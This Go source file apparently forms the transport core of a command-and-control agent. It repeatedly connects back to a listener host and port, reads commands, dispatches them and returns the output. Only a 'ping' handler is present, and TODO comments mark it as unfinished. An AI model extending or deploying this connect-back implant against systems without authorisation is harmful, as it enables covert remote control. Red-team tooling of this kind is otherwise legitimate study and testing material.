package agent

/*
*
 */

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"time"

	"konstantinovitz.com/poopitmaster/internal/utils"
)

// Agent struct contains shared state and dependencies for the agent
type Agent struct {
	lhost      string
	lport      string
	conn       net.Conn
	reader     *bufio.Reader
	maxRetries int
	baseDelay  time.Duration
}

func NewTCPAgent(lhost string, lport string) *Agent {
	return &Agent{
		lhost:      lhost,
		lport:      lport,
		maxRetries: 1000,
		baseDelay:  2 * time.Second,
		// Calculate how long that is???
	}
}

func (agent *Agent) Start() {
	// TODO: abstract out transport/comms
	commandManager := utils.NewCommandManager()

	commandManager.RegisterHandler("ping", handlePing)

	retries := 0

	// Retry loop with exponential backoff
	for {
		err := agent.connect()
		if err != nil {
			if retries >= agent.maxRetries {
				fmt.Printf("Max retries reached. Exiting...\n")
				return
			}
			retries++
			backoffDuration := agent.backoff(retries)
			fmt.Printf("Failed to connect. Retrying in %v...\n", backoffDuration)
			time.Sleep(backoffDuration)
		} else {
			//=== Start REPL
			fmt.Println("Connected successfully.")
			agent.REPL(commandManager)
			// Reset retries
			retries = 0
		}
	}
}

func (agent *Agent) connect() error {
	// TODO: re-write by hand tomorrows
	fmt.Printf("Connecting to %s:%s...\n", agent.lhost, agent.lport)
	var err error
	agent.conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%s", agent.lhost, agent.lport), 10*time.Second)
	if err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	agent.reader = bufio.NewReader(agent.conn)
	return nil
}

func (agent *Agent) REPL(commandManager *utils.CommandManager) {
	// Infinite REPL-style loop
	for {

		// === Read from server
		command, err := agent.reader.ReadString('\n')
		if err != nil {
			fmt.Println("Connection closed:", err)
			// Attempt to re-connect
			err := agent.connect()
			if err != nil {
				break
			}
		}
		command = strings.TrimSpace(command)

		// Split command into base and arguments
		cmdSlice := strings.Split(command, " ")
		cmdBase := cmdSlice[0]
		cmdArgs := cmdSlice[1:]

		// === Eval
		res, err := commandManager.HandleCommand(cmdBase, cmdArgs)

		// === Exit Logic
		// TODO: is there some way to make this less of a special case?
		// maybe use a channel for all this?
		if res == "exit" {
			fmt.Println("Exiting agent...")
			break
		}

		//=== Print
		if err != nil {
			agent.conn.Write([]byte(fmt.Sprintf("Error: %v\nEND_OF_RESPONSE\n", err)))
		} else {
			if !strings.HasSuffix(res, "\n") {
				res = res + "\n"
			}
			agent.conn.Write([]byte(fmt.Sprintf("%sEND_OF_RESPONSE\n", res))) // Append the marker
		}
	}
}

func (agent *Agent) Stop() {
	if agent.conn != nil {
		agent.conn.Close()
	}
}
